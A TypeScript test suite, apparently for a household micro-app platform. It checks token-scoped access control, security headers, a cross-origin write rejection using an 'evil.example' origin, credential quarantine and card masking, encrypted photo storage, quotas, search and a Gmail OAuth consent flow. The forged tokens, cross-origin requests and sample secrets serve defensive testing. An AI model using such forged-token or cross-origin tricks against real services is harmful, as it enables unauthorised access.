  const method = c.method ?? (c.body !== undefined || c.raw !== undefined ? 'POST' : 'GET');
  return handleApi(new Request(url, { method, headers, ...(c.body !== undefined ? { body: JSON.stringify(c.body) } : c.raw !== undefined ? { body: c.raw } : {}) }), live.rig.env, { fetch: c.fetch ?? live.rig.deps.fetch });
}
const tokenFor = (live: Live, scope: 'preview' | 'install', o: { app_id?: string; household_id?: string; ttl?: number; secret?: string; at?: Date } = {}): Promise<string> =>
  signAppToken(o.secret ?? live.rig.env.SESSION_SECRET, { household_id: o.household_id ?? live.h.household_id, app_id: o.app_id ?? live.app_id, scope }, o.ttl ?? 3600, o.at ?? new Date());
const setStatus = (live: Live, status: 'STAGED' | 'LIVE' | 'ARCHIVED') => rt.db.prepare('UPDATE micro_apps SET status = ? WHERE app_id = ?').bind(status, live.app_id).run();
const PAD = { text: 'Pad Thai\nIngredients: rice noodles, shrimp, tamarind paste, peanuts\n1. Soak the noodles.' };

test('RUNTIME ACCESS: no credentials is 401 without revealing whether the app exists; another household sees 404; a bad or expired token is not credentials', async () => {
  const live = await liveApp();
  const other = await makeHousehold(rt.db);
  const nope = await hit(live, { path: appPath(live.h) });
  const nobody = await hit(live, { path: `/apps/${live.h.household_id}/no-such-app` });
  assert.deepEqual([nope.status, nobody.status], [401, 401]);
  assert.deepEqual(await asJson(nope), await asJson(nobody), 'the same answer whether or not the app exists');
  assert.equal((await hit(live, { path: appPath(live.h), bearer: live.h })).status, 200);
  assert.equal((await hit(live, { path: `/apps/${live.h.household_id}/no-such-app`, bearer: live.h })).status, 404);
  assert.equal((await hit(live, { path: appPath(live.h), bearer: other })).status, 404, "a member of another household: the app does not exist");
  assert.equal((await hit(live, { path: appPath(live.h, '/api/search?q=a'), bearer: other })).status, 404);
  const forged = await tokenFor(live, 'install', { secret: 'some-other-secret-0123456789' });
  assert.equal((await hit(live, { path: appPath(live.h), token: forged })).status, 401, 'a token signed with another secret is nothing');
  const old = await tokenFor(live, 'install', { ttl: 60, at: new Date(Date.now() - 3600_000) });
  assert.equal((await hit(live, { path: appPath(live.h), token: old })).status, 401, 'expired');
  assert.equal((await hit(live, { path: appPath(live.h), token: 'garbage' })).status, 401);
  assert.equal((await hit(live, { path: appPath(live.h, '/nothing-here'), bearer: live.h })).status, 404);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/search'), method: 'DELETE', bearer: live.h })).status, 404, 'only the manifest routes exist');
  assert.equal((await hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, method: 'GET' })).status, 404);
});

test('RUNTIME ACCESS: the install token is read-only and scoped to exactly (household, app); the preview token may write; headers are strict', async () => {
  const live = await liveApp();
  const other = await liveApp();
  const install = await tokenFor(live, 'install');
  const page = await hit(live, { path: appPath(live.h), token: install });
  assert.equal(page.status, 200);
  const csp = page.headers.get('content-security-policy')!;
  assert.ok(csp.includes("default-src 'none'") && csp.includes("connect-src 'self'") && csp.includes('frame-ancestors *'), csp);
  assert.equal(page.headers.get('cache-control'), 'private, no-store');
  assert.equal(page.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(page.headers.get('referrer-policy'), 'no-referrer');
  const html = await page.text();
  assert.ok(html.includes(`<base href="/apps/${live.h.household_id}/${SLUG}/">`));
  const member = await hit(live, { path: appPath(live.h), bearer: live.h });
  assert.ok(member.headers.get('content-security-policy')!.includes("frame-ancestors 'self'"));
  assert.equal((await hit(live, { path: appPath(live.h, '/api/search'), token: install })).status, 200);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/suggest'), token: install })).status, 200);
  const write = await hit(live, { path: appPath(live.h, '/api/parse-recipe'), token: install, body: PAD });
  assert.equal(write.status, 403);
  assert.equal((await asJson(write))['error'], 'READ_ONLY');
  assert.equal((await hit(live, { path: appPath(live.h, '/preview'), token: install })).status, 404, 'the embed has no preview page');
  assert.equal((await hit(live, { path: appPath(live.h), token: await tokenFor(live, 'install', { app_id: other.app_id }) })).status, 404, "a token for another app");
  assert.equal((await hit(live, { path: appPath(live.h), token: await tokenFor(live, 'install', { household_id: other.h.household_id }) })).status, 404, "a token for another household");
  assert.equal((await hit(other, { path: appPath(live.h), token: install })).status, 200, 'the token is the credential, whoever carries it');
  assert.equal((await hit(live, { path: appPath(other.h), token: install })).status, 404, 'but only for its own household path');
  const preview = await tokenFor(live, 'preview');
  assert.equal((await hit(live, { path: appPath(live.h, '/preview'), token: preview })).status, 200);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/parse-recipe'), token: preview, body: PAD })).status, 200);
});

test('RUNTIME STATUS: STAGED serves only /preview and api/ to members and preview tokens, never the public page or an install token; ARCHIVED is 404 for everyone', async () => {
  const live = await liveApp();
  const preview = await tokenFor(live, 'preview');
  const install = await tokenFor(live, 'install');
  await setStatus(live, 'STAGED');
  const s = async (path: string, c: Partial<Call>) => (await hit(live, { path: appPath(live.h, path), ...c })).status;
  assert.deepEqual([await s('', { bearer: live.h }), await s('/preview', { bearer: live.h }), await s('/api/search', { bearer: live.h }), await s('/api/suggest', { bearer: live.h })], [404, 200, 200, 200]);
  assert.deepEqual([await s('', { token: preview }), await s('/preview', { token: preview }), await s('/api/search', { token: preview })], [404, 200, 200]);
  assert.deepEqual([await s('', { token: install }), await s('/api/search', { token: install }), await s('/preview', { token: install })], [404, 404, 404], 'the embed sees nothing until the member publishes');
  await setStatus(live, 'ARCHIVED');
  assert.deepEqual([await s('', { bearer: live.h }), await s('/preview', { bearer: live.h }), await s('/api/search', { bearer: live.h }), await s('', { token: preview }), await s('', { token: install })], [404, 404, 404, 404, 404]);
  await setStatus(live, 'LIVE');
  assert.equal(await s('', { bearer: live.h }), 200);
});

test('RUNTIME: a cookie-authenticated write needs a same-origin request; a bearer token does not', async () => {
  const live = await liveApp();
  const cookie = `__Host-session=${await sealCookie(live.rig.env.SESSION_SECRET, 'session', { household_id: live.h.household_id, member_id: `mem_${live.h.household_id}` }, 3600, new Date())}`;
  const post = (headers: Record<string, string>) =>
    handleApi(new Request(`${APP_ORIGIN}${appPath(live.h, '/api/parse-recipe')}`, { method: 'POST', headers: { 'content-type': 'application/json', cookie, ...headers }, body: JSON.stringify(PAD) }), live.rig.env, { fetch: live.rig.deps.fetch });
  assert.equal((await post({})).status, 403);
  assert.equal((await post({ origin: 'https://evil.example' })).status, 403);
  assert.equal((await post({ origin: APP_ORIGIN })).status, 200);
});

test('PARSE: only redacted text reaches the model; a credential is 422 and costs nothing; the photo is stored encrypted and never sent; the cap is the output of one reader', async () => {
  const live = await liveApp();
  const model = makeGoalModel();
  const f = fetchWith(model);
  const used = async () => (await fx.one<{ n: number }>('SELECT monthly_ai_calls_used AS n FROM micro_apps WHERE app_id = ?', live.app_id)).n;
  const post = (body: unknown) => hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, body, fetch: f });

  const quarantined = await post({ text: 'Soup\nIngredients: water\nmy password: hunter2' });
  assert.deepEqual([quarantined.status, (await asJson(quarantined))['error']], [422, 'QUARANTINED']);
  assert.deepEqual([model.calls.length, await used()], [0, 0], 'no model call, no quota');

  const masked = await post({ caption: 'Mom card 4111 1111 1111 1111', text: PAD.text });
  assert.equal(masked.status, 200);
  assert.ok(!model.calls[0]!.sentText.includes('4111 1111') && model.calls[0]!.sentText.includes('[ACCT ****1111]'));
  assert.equal(await used(), 1);

  assert.equal((await post({})).status, 400);
  assert.equal((await post({ text: '   ' })).status, 400);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, raw: 'not json', fetch: f })).status, 400);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, raw: '[1]', fetch: f })).status, 400);
  const long = await post({ text: 'a '.repeat(4001) });
  assert.deepEqual([long.status, (await asJson(long))['error']], [413, 'TOO_LARGE']);
  assert.equal((await post({ text: 'a'.repeat(8000) })).status, 200, 'exactly 8,000 characters is allowed');
  assert.equal(model.calls.length, 2);

  // the photo
  const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Array.from({ length: 64 }, (_, i) => i)]);
  const b64 = Buffer.from(png).toString('base64');
  const withPhoto = await post({ ...PAD, image_b64: b64, image_type: 'image/png' });
  assert.equal(withPhoto.status, 200);
  const rec = (await asJson(withPhoto))['record'];
  assert.ok(rec.data.image_r2_key.startsWith(`apps/${live.h.household_id}/${live.app_id}/`) && rec.data.image_r2_key.endsWith('.png.enc'));
  const stored = new Uint8Array(await (await rt.bucket.get(rec.data.image_r2_key))!.arrayBuffer());
  assert.notDeepEqual([...stored.subarray(0, 8)], [...png.subarray(0, 8)], 'ciphertext, not the picture');
  assert.deepEqual([...(await getDecrypted(live.rig.env, live.h.household_id, rec.data.image_r2_key))!], [...png], 'the household key opens it');
  assert.ok(!model.calls.at(-1)!.sentText.includes(b64.slice(0, 20)), 'no pixel went to a model');
  const before = model.calls.length;
  for (const [name, body, status] of [
    ['gif', { ...PAD, image_b64: b64, image_type: 'image/gif' }, 415],
    ['png that is not a png', { ...PAD, image_b64: Buffer.from('hello hello hello').toString('base64'), image_type: 'image/png' }, 415],
    ['not base64', { ...PAD, image_b64: '!!!', image_type: 'image/png' }, 415],
    ['not a string', { ...PAD, image_b64: 5, image_type: 'image/png' }, 415],
    ['empty', { ...PAD, image_b64: '', image_type: 'image/png' }, 415],
    ['over 4 MB', { ...PAD, image_b64: Buffer.from(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...new Uint8Array(4 * 1024 * 1024)])).toString('base64'), image_type: 'image/png' }, 413],
  ] as const) assert.equal((await post(body)).status, status, name);
  assert.equal(model.calls.length, before, 'a bad photo is refused before the model or the quota');
  void used;
});

test('QUOTA: 100 AI reads a month; the 101st is 429 QUOTA_EXCEEDED with no model call; a new month starts again; a failed read gives its call back', async () => {
  const live = await liveApp();
  const model = makeGoalModel();
  const f = fetchWith(model);
  const row = () => fx.one<{ used: number; cap: number; month: string | null }>('SELECT monthly_ai_calls_used AS used, monthly_ai_calls_cap AS cap, quota_month AS month FROM micro_apps WHERE app_id = ?', live.app_id);
  const parse = (i: number) => hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, body: { text: `Recipe ${i}\nIngredients: item ${i}` }, fetch: f });
  for (let i = 1; i <= 100; i++) assert.equal((await parse(i)).status, 200, `parse ${i}`);
  assert.deepEqual(await row(), { used: 100, cap: 100, month: new Date().toISOString().slice(0, 7) });
  const over = await parse(101);
  assert.deepEqual([over.status, (await asJson(over))['error']], [429, 'QUOTA_EXCEEDED']);
  assert.equal(model.calls.length, 100, 'the 101st never reached the model');
  assert.equal((await row()).used, 100);
  assert.equal(await count('SELECT 1 FROM micro_app_records WHERE app_id = ?', live.app_id), 100);
  assert.equal((await hit(live, { path: appPath(live.h, '/api/search?q=item'), bearer: live.h })).status, 200, 'reading is never metered');

  await rt.db.prepare(`UPDATE micro_apps SET quota_month = '2020-01' WHERE app_id = ?`).bind(live.app_id).run();
  assert.equal((await parse(102)).status, 200, 'a new month starts the count again');
  assert.deepEqual(await row(), { used: 1, cap: 100, month: new Date().toISOString().slice(0, 7) });

  const broken = fetchWith(makeGoalModel({ parse: () => ({ nothing: true }) }));
  const failed = await hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, body: PAD, fetch: broken });
  assert.deepEqual([failed.status, (await asJson(failed))['error']], [502, 'PARSE_FAILED']);
  assert.equal((await row()).used, 1, 'the failed read was given back');
  const down = createGuardedFetch({ db: rt.db, fetchImpl: (async () => new Response('boom', { status: 500 })) as typeof fetch, ttlMs: 0 });
  const err = await hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, body: PAD, fetch: down });
  assert.equal(err.status, 502);
  assert.equal((await row()).used, 1);
});

test('SEARCH AND SUGGEST: words match from the start of ingredients, titles and tags; suggestions come from this household\'s facts and honour dietary restrictions; records never cross households', async () => {
  const a = await liveApp();
  const b = await liveApp();
  await seedPrefs(a.h);
  const f = fetchWith(makeGoalModel({ parse: (t) => ({ title: t.split('\n')[0], ingredients: /Ingredients: (.*)/.exec(t)![1]!.split(', '), steps: ['cook'], tags: /thai/i.test(t) ? ['thai'] : ['italian'], prep_minutes: 10 }) }));
  const add = (live: Live, text: string) => hit(live, { path: appPath(live.h, '/api/parse-recipe'), bearer: live.h, body: { text }, fetch: f });
  assert.equal((await add(a, 'Pad Thai\nIngredients: rice noodles, shrimp, peanuts (thai)')).status, 200);
  assert.equal((await add(a, 'Green Curry\nIngredients: coconut milk, chicken, thai basil')).status, 200);
  assert.equal((await add(a, 'Spaghetti\nIngredients: wheat pasta, tomato, basil')).status, 200);
  assert.equal((await add(b, 'Secret Stew\nIngredients: beef, noodles')).status, 200);
  const q = async (live: Live, qs: string) => ((await asJson(await hit(live, { path: appPath(live.h, `/api/search${qs}`), bearer: live.h })))['records'] as any[]).map((r) => r.title).sort();
  assert.deepEqual(await q(a, '?q=noodles'), ['Pad Thai']);
  assert.deepEqual(await q(a, '?q=nood'), ['Pad Thai'], 'prefix');
  assert.deepEqual(await q(a, '?q=oodles'), [], 'not a substring');
  assert.deepEqual(await q(a, '?q=basil'), ['Green Curry', 'Spaghetti']);
  assert.deepEqual(await q(a, '?q=basil+thai'), ['Green Curry'], 'every word must match');
  assert.deepEqual(await q(a, '?tag=thai'), ['Green Curry', 'Pad Thai']);
  assert.deepEqual(await q(a, '?q=basil&tag=thai'), ['Green Curry']);
  assert.deepEqual(await q(a, '?q=%25'), ['Green Curry', 'Pad Thai', 'Spaghetti'], 'a query with no words filters nothing; % and _ are never wildcards');
  assert.deepEqual(await q(a, ''), ['Green Curry', 'Pad Thai', 'Spaghetti'], 'no query: the newest');
  assert.deepEqual(await q(b, '?q=noodles'), ['Secret Stew'], "another household's app has its own records");
  assert.deepEqual(await q(b, '?q=thai'), []);
  const sug = await asJson(await hit(a, { path: appPath(a.h, '/api/suggest'), bearer: a.h }));
  assert.deepEqual(sug['used_facts'], { cuisines: ['Thai'], restrictions: ['gluten-free'] });
  assert.ok(sug['suggestions'].length >= 1 && sug['suggestions'].length <= 3);
  const text = JSON.stringify(sug['suggestions']);
  assert.ok(text.includes('Pad Thai') || text.includes('Green Curry'), 'Thai dishes are suggested');
  assert.deepEqual((await asJson(await hit(b, { path: appPath(b.h, '/api/suggest'), bearer: b.h })))['used_facts'], { cuisines: [], restrictions: [] }, 'b has no preferences of its own');
  assert.equal(await count('SELECT 1 FROM micro_app_records WHERE household_id = ? AND app_id = ?', a.h.household_id, b.app_id), 0);
});

// ═══════════════ the goals API ═══════════════

test('API: authentication, methods, validation and tenancy of /api/goals', async () => {
  const h = await makeHousehold(rt.db);
  const other = await makeHousehold(rt.db);
  const { env } = (await import('./helpers/m2')).testEnv(rt);
  const bare = (path: string, method = 'GET') => handleApi(new Request(`${APP_ORIGIN}${path}`, { method }), env);
  assert.equal((await bare('/api/goals')).status, 401);
  assert.equal((await bare('/api/goals', 'POST')).status, 401);
  assert.equal((await api(env, '/api/goals', h, { method: 'DELETE' })).status, 405);
  assert.equal((await api(env, '/api/goals/goal_00000000000000000000000000000000/approve', h, { method: 'GET' })).status, 405);
  assert.equal((await api(env, '/api/goals/xyz', h)).status, 404);
  assert.equal((await api(env, '/api/goals/goal_00000000000000000000000000000000', h)).status, 404);
  for (const body of [{}, { prompt_text: 5 }, { prompt_text: '   ' }, { other: 'x' }]) assert.equal((await api(env, '/api/goals', h, { body })).status, 400, JSON.stringify(body));
  assert.equal((await api(env, '/api/goals', h, { raw: 'not json' })).status, 400);
  assert.equal((await api(env, '/api/goals', h, { body: { prompt_text: 'x'.repeat(2001) } })).status, 413);
  assert.equal((await api(env, '/api/goals', h, { body: { prompt_text: 'x'.repeat(2000) } })).status, 202, 'exactly 2,000 characters');
  const pw = await api(env, '/api/goals', h, { body: { prompt_text: 'Build me an app, my password: hunter2' } });
  assert.deepEqual([pw.status, (await asJson(pw))['error']], [422, 'quarantined']);
  assert.equal(await count('SELECT 1 FROM goals WHERE household_id = ? AND prompt_text LIKE ?', h.household_id, '%hunter2%'), 0, 'nothing was stored');

  const made = await asJson(await api(env, '/api/goals', h, { body: { prompt_text: RESEARCH_PROMPT } }));
  assert.deepEqual([made['tier'], made['credits'], made['max_cost_usd']], ['research_plan', 3, 0.75]);
  const id = made['goal_id'] as string;
  const mine = await asJson(await api(env, `/api/goals/${id}`, h));
  assert.deepEqual([mine['status'], mine['credits_reserved'], mine['approval_hash'], mine['preview_url'], mine['prod_url'], mine['tasks']], ['PLANNING', 3, null, null, null, []]);
  assert.equal((await api(env, `/api/goals/${id}`, other)).status, 404);
  for (const action of ['approve', 'decline', 'retry']) assert.equal((await api(env, `/api/goals/${id}/${action}`, other, { body: {} })).status, 404, `${action} of someone else's goal`);
  const list = (await asJson(await api(env, '/api/goals', h)))['goals'] as any[];
  assert.ok(list.length >= 2 && list.some((g) => g.goal_id === id) && list.every((g, i) => i === 0 || list[i - 1].created_at >= g.created_at), 'newest first');
  assert.deepEqual(((await asJson(await api(env, '/api/goals', other)))['goals'] as any[]), []);
  const notAwaiting = await api(env, `/api/goals/${id}/approve`, h, { body: { approval_hash: 'x' } });
  assert.deepEqual([notAwaiting.status, (await asJson(notAwaiting))['error']], [409, 'not_awaiting']);
  assert.equal((await api(env, `/api/goals/${id}/decline`, h, { body: {} })).status, 409);
  const retryNow = await api(env, `/api/goals/${id}/retry`, h, { body: {} });
  assert.deepEqual([retryNow.status, (await asJson(retryNow))['status']], [200, 'already_started'], 'a goal that is not halted has nothing to retry');

  await rt.db.prepare(`UPDATE goals SET status = 'INSUFFICIENT_CREDITS' WHERE goal_id = ?`).bind(id).run();
  const declined = await api(env, `/api/goals/${id}/decline`, h, { body: {} });
  assert.deepEqual([declined.status, (await asJson(declined))['status']], [200, 'declined']);
  assert.deepEqual([(await goalRow(id))['status'], (await goalRow(id))['error_code']], ['DECLINED', 'declined']);
  const again = await api(env, `/api/goals/${id}/approve`, h, { body: {} });
  assert.deepEqual([again.status, (await asJson(again))['status']], [200, 'already_decided']);
});

test('API: the approve and decline calls reach the waiting Workflow only with the staged hash; a decline event refunds', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h);
  await createViaApi(rig, h, WIFE_PROMPT);
  const seen: Record<string, unknown> = {};
  const run = await runToEnd(rig, async () => {
    const row = await goalRow(rig.params.goal_id);
    const detail = await asJson(await api(rig.env, `/api/goals/${rig.params.goal_id}`, h));
    seen['hash'] = detail['approval_hash'] === row['approval_hash'] && typeof detail['approval_hash'] === 'string';
    seen['preview'] = detail['preview_url'];
    seen['missing'] = (await api(rig.env, `/api/goals/${rig.params.goal_id}/approve`, h, { body: {} })).status;
    seen['events0'] = rig.workflows.goalEvents.length;
    const res = await api(rig.env, `/api/goals/${rig.params.goal_id}/decline`, h, { body: {} });
    seen['decline'] = res.status;
    return rig.workflows.goalEvents.at(-1)!.payload;
  }, rt);
  assert.equal(seen['hash'], true);
  assert.equal(seen['preview'], `${APP_ORIGIN}/apps/${h.household_id}/${SLUG}/preview`);
  assert.deepEqual([seen['missing'], seen['events0'], seen['decline']], [409, 0, 202]);
  assert.deepEqual(run.outcome, { status: 'declined', reason: 'declined' });
  assert.equal((await buckets(h)).total, 5);
  assert.equal((await asJson(await api(rig.env, `/api/goals/${rig.params.goal_id}`, h)))['approval_hash'], null, 'the hash is shown only while the goal awaits approval');
});

test('RESEARCH PLAN (Tier 2): 3 credits under $0.75, a 4-task DAG, a plan to approve, no app and no hosting', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 3);
  const rig = goalRig(rt, h);
  const made = await createViaApi(rig, h, RESEARCH_PROMPT);
  assert.deepEqual([made.tier, made.credits, made.max_cost_usd], ['research_plan', 3, 0.75]);
  const run = await runToEnd(rig, approve(), rt);
  assert.deepEqual(run.outcome, { status: 'completed', prod_url: null });
  const id = rig.params.goal_id;
  const g = await goalRow(id);
  assert.deepEqual([g['status'], g['preview_url'], g['prod_url'], g['install_artifact_json']], ['COMPLETED', null, null, null]);
  assert.ok(g['cost_usd'] > 0 && g['cost_usd'] < 0.75);
  assert.deepEqual((await tasks(id)).map((t) => [t.kind, t.status]), [['decompose', 'PASSED'], ['context_gather', 'PASSED'], ['schema_gen', 'PASSED'], ['code_gen', 'PASSED'], ['verify_bundle', 'PASSED']]);
  const summary = JSON.parse(g['result_summary_json']);
  assert.ok(summary.sections.length >= 3 && summary.next_steps.length >= 1);
  assert.equal(await count('SELECT 1 FROM micro_apps WHERE goal_id = ?', id), 0);
  assert.equal(await count(`SELECT 1 FROM facts WHERE household_id = ? AND predicate = 'hosted_micro_app'`, h.household_id), 0);
  assert.deepEqual((await ledgerOf(id)).map((e) => e.delta), [-3]);
  assert.equal((await buckets(h)).total, 0);
  assert.equal(rig.model.count('GOAL-CODE. You write a research plan'), 1);
});

// ═══════════════ the feature-flagged Gmail consent flow ═══════════════

import { GMAIL_SCOPE, findGmailConnector } from '../src/connectors/gmailSync';
import { fakeGoogle, newGoogle } from './helpers/m3';

async function authed(env: Env, path: string, h: Household | null, fetchImpl: typeof fetch, headers: Record<string, string> = {}, method = 'GET'): Promise<Response> {
  return handleApi(new Request(`${APP_ORIGIN}${path}`, { method, headers: { ...(h === null ? {} : { authorization: `Bearer ${await bearer(env, h)}` }), ...headers } }), env, { fetch: fetchImpl });
}

test('GMAIL FLAG: anything but exactly "true" answers 403 CASA_PENDING before a Google URL, a cookie or a session is touched', async () => {
  const h = await makeHousehold(rt.db);
  for (const flag of [undefined, 'false', 'TRUE', 'True', '1', '', 'yes', ' true', 'true ']) {
    let network = 0;
    const spy = (async () => {
      network += 1;
      return new Response('{}');
    }) as typeof fetch;
    const { env } = (await import('./helpers/m2')).testEnv(rt, flag === undefined ? {} : { ENABLE_GMAIL_OAUTH: flag });
    for (const path of ['/api/auth/google/gmail-connect', '/api/auth/google/gmail-callback?code=x&state=y']) {
      for (const who of [h, null]) {
        const res = await authed(env, path, who, spy);
        assert.equal(res.status, 403, `${String(flag)} ${path}`);
        assert.deepEqual(await res.json(), { error: 'CASA_PENDING', message: 'Connecting Gmail is not available yet.' });
        assert.equal(res.headers.get('location'), null, 'no redirect, so no Google URL');
        assert.equal(res.headers.get('set-cookie'), null);
      }
    }
    assert.equal((await authed(env, '/api/auth/google/gmail-connect', h, spy, {}, 'POST')).status, 403, 'the flag is checked before the method');
    assert.equal(network, 0);
  }
  const root = process.env['PROJECT_ROOT'] ?? process.cwd();
  const toml = readFileSync(join(root, 'wrangler.toml'), 'utf8');
  const vars = toml.split(/^\[vars\]\s*$/m)[1]!.split(/^\[/m)[0]!;
  assert.match(vars, /^ENABLE_GMAIL_OAUTH = "false"$/m, 'the shipped default is off');
});

test('GMAIL FLAG on: PKCE connect with only the Gmail read-only scope; the callback stores the refresh token AES-GCM-encrypted in KV and updates inbox_connections; a wrong scope stores nothing', async () => {
  const h = await makeHousehold(rt.db);
  const { env } = (await import('./helpers/m2')).testEnv(rt, { ENABLE_GMAIL_OAUTH: 'true' });
  const g = newGoogle();
  g.scope = GMAIL_SCOPE;
  const net = createGuardedFetch({ db: rt.db, fetchImpl: fakeGoogle(g), ttlMs: 0 });
  assert.equal((await authed(env, '/api/auth/google/gmail-connect', null, net)).status, 401, 'connect needs a session');
  assert.equal((await authed(env, '/api/auth/google/gmail-connect', h, net, {}, 'POST')).status, 405);
  assert.equal((await authed(env, '/api/auth/google/gmail-callback?code=x&state=y', null, net, {}, 'POST')).status, 405);

  const connect = await authed(env, '/api/auth/google/gmail-connect', h, net);
  assert.equal(connect.status, 302);
  const loc = new URL(connect.headers.get('location')!);
  assert.equal(loc.origin + loc.pathname, 'https://accounts.google.com/o/oauth2/v2/auth');
  assert.equal(loc.searchParams.get('scope'), GMAIL_SCOPE);
  assert.match(loc.searchParams.get('scope')!, /^https:\/\/www\.googleapis\.com\/auth\/gmail\.readonly$/);
  assert.deepEqual([loc.searchParams.get('code_challenge_method'), loc.searchParams.get('access_type'), loc.searchParams.get('response_type'), loc.searchParams.get('prompt'), loc.searchParams.get('include_granted_scopes')], ['S256', 'offline', 'code', 'consent', 'false']);
  assert.equal(loc.searchParams.get('redirect_uri'), `${APP_ORIGIN}/api/auth/google/gmail-callback`);
  assert.ok(loc.searchParams.get('code_challenge')!.length >= 43 && loc.searchParams.get('state')!.length >= 24);
  const cookie = connect.headers.get('set-cookie')!;
  assert.match(cookie, /^__Host-oauth=[^;]+; Max-Age=\d+; Path=\/; Secure; HttpOnly; SameSite=Lax$/);
  const cookieHeader = cookie.split(';')[0]!;
  const state = loc.searchParams.get('state')!;

  const cb = (qs: string, headers: Record<string, string> = { cookie: cookieHeader }) => authed(env, `/api/auth/google/gmail-callback${qs}`, null, net, headers);
  assert.equal((await cb(`?code=good-code&state=${state}`, {})).status, 400, 'no cookie');
  assert.equal((await cb(`?code=good-code&state=wrong`)).status, 400, 'wrong state');
  assert.equal((await cb(`?code=good-code`)).status, 400);
  assert.equal((await cb(`?error=access_denied&state=${state}`)).status, 400);
  assert.equal((await cb(`?code=bad-code&state=${state}`)).status, 502);
  assert.equal(await findGmailConnector(rt.db, h.household_id), null, 'nothing stored by the failures');

  const ok = await cb(`?code=good-code&state=${state}`);
  assert.equal(ok.status, 302);
  assert.equal(ok.headers.get('location'), '/?gmail=connected');
  assert.match(ok.headers.get('set-cookie')!, /__Host-oauth=; Max-Age=0/);
  const conn = await findGmailConnector(rt.db, h.household_id);
  assert.ok(conn !== null);
  const row = await fx.one<{ kind: string; status: string; token_kv_key: string; scopes: string }>(`SELECT kind, status, token_kv_key, scopes FROM connectors WHERE household_id = ? AND kind = 'gmail'`, h.household_id);
  assert.deepEqual([row.kind, row.status, row.scopes.includes('gmail.readonly')], ['gmail', 'active', true]);
  const kv = await env.KV.get(row.token_kv_key);
  assert.ok(kv !== null && !kv.includes('rt-secret'), 'AES-GCM ciphertext, not the token');
  assert.equal(await count('SELECT 1 FROM inbox_connections WHERE household_id = ?', h.household_id), 1);
  assert.equal(await count(`SELECT 1 FROM audit_log WHERE household_id = ? AND action = 'gmail_connected'`, h.household_id), 1);
  assert.equal(await count(`SELECT 1 FROM audit_log WHERE household_id = ? AND detail_json LIKE '%rt-secret%'`, h.household_id), 0);

  // a grant that is not exactly the Gmail read-only scope is refused and stores nothing
  const h2 = await makeHousehold(rt.db);
  const g2 = newGoogle();
  g2.scope = `${GMAIL_SCOPE} https://www.googleapis.com/auth/gmail.send`;
  const net2 = createGuardedFetch({ db: rt.db, fetchImpl: fakeGoogle(g2), ttlMs: 0 });
  const c2 = await authed(env, '/api/auth/google/gmail-connect', h2, net2);
  const s2 = new URL(c2.headers.get('location')!).searchParams.get('state')!;
  const bad = await authed(env, `/api/auth/google/gmail-callback?code=good-code&state=${s2}`, null, net2, { cookie: c2.headers.get('set-cookie')!.split(';')[0]! });
  assert.deepEqual([bad.status, (await asJson(bad))['error']], [403, 'scope_violation']);
  assert.equal(await findGmailConnector(rt.db, h2.household_id), null);
  assert.equal(await count('SELECT 1 FROM inbox_connections WHERE household_id = ?', h2.household_id), 0);

  // a member who has been removed since the attempt began cannot finish it
  const h3 = await makeHousehold(rt.db);
  const c3 = await authed(env, '/api/auth/google/gmail-connect', h3, net);
  await rt.db.prepare('DELETE FROM members WHERE household_id = ?').bind(h3.household_id).run();
  const s3 = new URL(c3.headers.get('location')!).searchParams.get('state')!;
  assert.equal((await authed(env, `/api/auth/google/gmail-callback?code=good-code&state=${s3}`, null, net, { cookie: c3.headers.get('set-cookie')!.split(';')[0]! })).status, 401, 'the member no longer exists');
});

// ═══════════════ source guards ═══════════════

test('SOURCE: no brand or inbound domain in src; the new files make no direct fetch(); the ledger shim is untouched; the Workflow is exported', () => {
  const root = process.env['PROJECT_ROOT'] ?? process.cwd();
  const walk = (dir: string): string[] => readdirSync(dir).flatMap((n) => (statSync(join(dir, n)).isDirectory() ? walk(join(dir, n)) : n.endsWith('.ts') ? [join(dir, n)] : []));
  const src = walk(join(root, 'src'));
  for (const f of src) assert.ok(!/hayes|askhayes/i.test(readFileSync(f, 'utf8')), `${f} must not hardcode the brand or its domain`);
  const strip = (t: string): string => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  for (const f of ['src/goals/goalPipeline.ts', 'src/goals/planVerifier.ts', 'src/goals/tiers.ts', 'src/workers/goalsApi.ts', 'src/connectors/gmailConsent.ts', 'src/workflows/goalExecutionWF.ts', 'src/builder/microAppRuntime.ts', 'src/builder/installPackager.ts', 'src/builder/smokeTest.ts']) {
    const code = strip(readFileSync(join(root, f), 'utf8')).replace(/(?:deps|ctx)\.fetch\(/g, '').replace(/'Rules: no eval[^\n]*'/, '');
    assert.ok(!/(?<![.\w])fetch\s*\(/.test(code), `${f} calls the network only through the guarded fetch it is given`);
  }
  assert.match(readFileSync(join(root, 'src/workflows/goalExecutionWF.ts'), 'utf8'), /runGoal\(step as unknown as StepLike, deps, \{ \.\.\.event\.payload, goal_id \}\)/, 'the Workflow hands the payload over unchanged');
  assert.match(readFileSync(join(root, 'src/index.ts'), 'utf8'), /export \{ GoalExecutionWF \} from '\.\/workflows\/goalExecutionWF';/);
  const toml = readFileSync(join(root, 'wrangler.toml'), 'utf8');
  assert.match(toml, /name = "goal-execution"\s*\nbinding = "GOAL_EXECUTION_WF"\s*\nclass_name = "GoalExecutionWF"/);
  assert.equal(readFileSync(join(root, 'src/missions/ledger.ts'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter((l) => l.trim() !== '').length, 1);
});


// ═══════════════ idempotence, context, collisions and failures ═══════════════

import type { StepLike } from '../src/ingest/steps';

